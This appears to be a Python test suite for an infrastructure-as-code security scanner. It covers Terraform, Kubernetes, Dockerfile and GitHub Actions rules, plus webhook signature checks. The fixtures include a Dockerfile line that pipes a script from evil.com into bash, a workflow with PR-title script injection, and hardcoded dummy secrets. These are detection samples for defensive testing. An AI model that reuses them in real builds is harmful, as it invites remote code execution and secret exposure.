"""
Offline test suite – no GitHub credentials or Gemini key needed.
Tests: deterministic rules, file classifier, webhook signature verification.
"""
import hashlib
import hmac
import json
import sys
import traceback

PASS = "\033[92mPASS\033[0m"
FAIL = "\033[91mFAIL\033[0m"

results = []


# ── Helpers ────────────────────────────────────────────────────────────────────
def assert_rule(findings, prefix):
    matched = [f for f in findings if f.rule.startswith(prefix)]
    assert matched, f"Expected rule {prefix!r}, got: {[f.rule for f in findings]}"

def assert_no_rule(findings, prefix):
    matched = [f for f in findings if f.rule.startswith(prefix)]
    assert not matched, f"Rule {prefix!r} should NOT fire, got: {[f.rule for f in findings]}"

def assert_empty(findings):
    assert not findings, f"Expected no findings, got: {[f.rule for f in findings]}"

def assert_redacted(findings):
    for f in findings:
        assert "SuperSecret123" not in f.raw_evidence, "Secret leaked in evidence"
        assert "abc123" not in f.raw_evidence, "Secret leaked in evidence"

def assert_(cond):
    assert cond


def test(name, fn):
    try:
        fn()
        print(f"  {PASS}  {name}")
        results.append((name, True, None))
    except Exception as e:
        print(f"  {FAIL}  {name}")
        print(f"         {e}")
        traceback.print_exc()
        results.append((name, False, e))


# ── Terraform rules ────────────────────────────────────────────────────────────
print("\n── Terraform ──")
from app.scanner.rules import terraform

TF_OPEN_CIDR = 'cidr_blocks = ["0.0.0.0/0"]'
TF_SECRET    = 'password = "SuperSecret123"'
TF_ENCRYPTED = 'encrypted = false'
TF_PUBLIC_IP = 'associate_public_ip_address = true'
TF_IAM_STAR  = '"Action": "*"'

test("TF001 open CIDR detected",        lambda: assert_rule(terraform.scan("a.tf", TF_OPEN_CIDR), "TF001"))
test("TF002 hardcoded secret detected", lambda: assert_rule(terraform.scan("a.tf", TF_SECRET), "TF002"))
test("TF003 encryption=false detected", lambda: assert_rule(terraform.scan("a.tf", TF_ENCRYPTED), "TF003"))
test("TF004 public IP detected",        lambda: assert_rule(terraform.scan("a.tf", TF_PUBLIC_IP), "TF004"))
test("TF005 IAM wildcard detected",     lambda: assert_rule(terraform.scan("a.tf", TF_IAM_STAR), "TF005"))
test("TF002 secret redacted in evidence", lambda: assert_redacted(terraform.scan("a.tf", TF_SECRET)))
test("Clean TF has no findings",        lambda: assert_empty(terraform.scan("a.tf", 'resource "aws_vpc" "main" {}')))


# ── Kubernetes rules ───────────────────────────────────────────────────────────
print("\n── Kubernetes ──")
from app.scanner.rules import kubernetes

K8S_PRIVILEGED = """
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: nginx:1.25
        securityContext:
          privileged: true
"""

K8S_HOST_PID = """
apiVersion: v1
kind: Pod
spec:
  hostPID: true
  containers:
  - name: app
    image: nginx:1.25
"""

K8S_NO_LIMITS = """
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: nginx:1.25
"""

K8S_LATEST = """
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: nginx:latest
        resources:
          limits:
            cpu: 100m
"""

test("K8S003 privileged container",   lambda: assert_rule(kubernetes.scan("k.yaml", K8S_PRIVILEGED), "K8S003"))
test("K8S001 hostPID detected",       lambda: assert_rule(kubernetes.scan("k.yaml", K8S_HOST_PID), "K8S001"))
test("K8S006 no resource limits",     lambda: assert_rule(kubernetes.scan("k.yaml", K8S_NO_LIMITS), "K8S006"))
test("K8S007 unpinned image :latest", lambda: assert_rule(kubernetes.scan("k.yaml", K8S_LATEST), "K8S007"))
test("Invalid YAML returns empty",    lambda: assert_empty(kubernetes.scan("k.yaml", "{{{")))


# ── Dockerfile rules ───────────────────────────────────────────────────────────
print("\n── Dockerfile ──")
from app.scanner.rules import dockerfile

DF_LATEST    = "FROM ubuntu:latest\nUSER nobody\n"
DF_SECRET    = "FROM ubuntu:20.04\nENV PASSWORD=abc123\nUSER nobody\n"
DF_CURL_PIPE = "FROM ubuntu:20.04\nRUN curl https://evil.com/install.sh | bash\nUSER nobody\n"
DF_NO_USER   = "FROM ubuntu:20.04\nRUN apt-get update\n"
DF_SSH       = "FROM ubuntu:20.04\nEXPOSE 22\nUSER nobody\n"

test("DF001 FROM :latest detected",      lambda: assert_rule(dockerfile.scan("Dockerfile", DF_LATEST), "DF001"))
test("DF007 ENV secret detected",        lambda: assert_rule(dockerfile.scan("Dockerfile", DF_SECRET), "DF007"))
test("DF005 curl|bash detected",         lambda: assert_rule(dockerfile.scan("Dockerfile", DF_CURL_PIPE), "DF005"))
test("DF008 no USER directive detected", lambda: assert_rule(dockerfile.scan("Dockerfile", DF_NO_USER), "DF008"))
test("DF006 SSH port exposed",           lambda: assert_rule(dockerfile.scan("Dockerfile", DF_SSH), "DF006"))
test("DF007 secret redacted",            lambda: assert_redacted(dockerfile.scan("Dockerfile", DF_SECRET)))


# ── GitHub Actions rules ───────────────────────────────────────────────────────
print("\n── GitHub Actions ──")
from app.scanner.rules import github_actions

GA_INJECTION = """
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
        shell: bash
"""

GA_UNPINNED = """
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
"""

GA_PINNED = """
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
"""

GA_WRITE_ALL = """
on: [push]
permissions: write-all
jobs: {}
"""

test("GA001 script injection detected",  lambda: assert_rule(github_actions.scan(".github/workflows/ci.yml", GA_INJECTION), "GA001"))
test("GA004 unpinned action detected",   lambda: assert_rule(github_actions.scan(".github/workflows/ci.yml", GA_UNPINNED), "GA004"))
test("GA004 pinned SHA not flagged",     lambda: assert_no_rule(github_actions.scan(".github/workflows/ci.yml", GA_PINNED), "GA004"))
test("GA002 write-all detected",         lambda: assert_rule(github_actions.scan(".github/workflows/ci.yml", GA_WRITE_ALL), "GA002"))


# ── File classifier ────────────────────────────────────────────────────────────
print("\n── File classifier ──")
from app.scanner.filters import classify, is_scannable, FileType

test("Dockerfile classified",              lambda: assert_(classify("Dockerfile") == FileType.dockerfile))
test(".tf classified as terraform",        lambda: assert_(classify("infra/main.tf") == FileType.terraform))
test("GHA workflow classified",            lambda: assert_(classify(".github/workflows/ci.yml") == FileType.github_actions))
test("k8s yaml classified",               lambda: assert_(classify("deploy/app.yaml") == FileType.kubernetes))
test("python file not scannable",          lambda: assert_(not is_scannable("app/main.py")))
test("Dockerfile is scannable",            lambda: assert_(is_scannable("Dockerfile")))


# ── Webhook signature verification ────────────────────────────────────────────
print("\n── Webhook signature ──")
import os, asyncio
from fastapi import HTTPException
from unittest.mock import patch, MagicMock

SECRET = "test-webhook-secret-xyz"

def make_sig(payload: bytes, secret: str) -> str:
    return "sha256=" + hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()

def test_sig_valid():
    payload = b'{"action":"opened"}'
    sig = make_sig(payload, SECRET)
    with patch("app.webhook.get_settings") as mock_cfg:
        mock_cfg.return_value = MagicMock(github_webhook_secret=SECRET)
        from app.webhook import verify_signature
        verify_signature(payload, sig)  # must not raise

def test_sig_invalid():
    payload = b'{"action":"opened"}'
    bad_sig = make_sig(payload, "wrong-secret")
    with patch("app.webhook.get_settings") as mock_cfg:
        mock_cfg.return_value = MagicMock(github_webhook_secret=SECRET)
        from app.webhook import verify_signature
        try:
            verify_signature(payload, bad_sig)
            raise AssertionError("should have raised HTTPException")
        except HTTPException as e:
            assert e.status_code == 401

def test_sig_missing():
    with patch("app.webhook.get_settings") as mock_cfg:
        mock_cfg.return_value = MagicMock(github_webhook_secret=SECRET)
        from app.webhook import verify_signature
        try:
            verify_signature(b"payload", None)
            raise AssertionError("should have raised HTTPException")
        except HTTPException as e:
            assert e.status_code == 401

test("Valid signature accepted",   test_sig_valid)
test("Wrong secret rejected",      test_sig_invalid)
test("Missing signature rejected", test_sig_missing)


# ── Deterministic dispatcher ───────────────────────────────────────────────────
print("\n── Deterministic dispatcher ──")
from app.scanner.deterministic import run_deterministic

FILES = {
    "main.tf":       'cidr_blocks = ["0.0.0.0/0"]',
    "Dockerfile":    "FROM ubuntu:latest\n",
    "deploy.yaml":   K8S_PRIVILEGED,
    ".github/workflows/ci.yml": GA_INJECTION,
    "app/main.py":   "print('hello')",   # should be ignored
}

def test_dispatcher():
    result = run_deterministic(FILES)
    assert "app/main.py" not in result.scanned_files, "Python file should be skipped"
    assert len(result.scanned_files) == 4
    assert len(result.findings) > 0

test("Dispatcher scans 4 infra files, skips .py", test_dispatcher)


# ── Summary ────────────────────────────────────────────────────────────────────
print()
passed = sum(1 for _, ok, _ in results if ok)
failed = sum(1 for _, ok, _ in results if not ok)
total  = len(results)
print(f"Results: {passed}/{total} passed", "✓" if failed == 0 else f"  {failed} FAILED")
if failed:
    sys.exit(1)


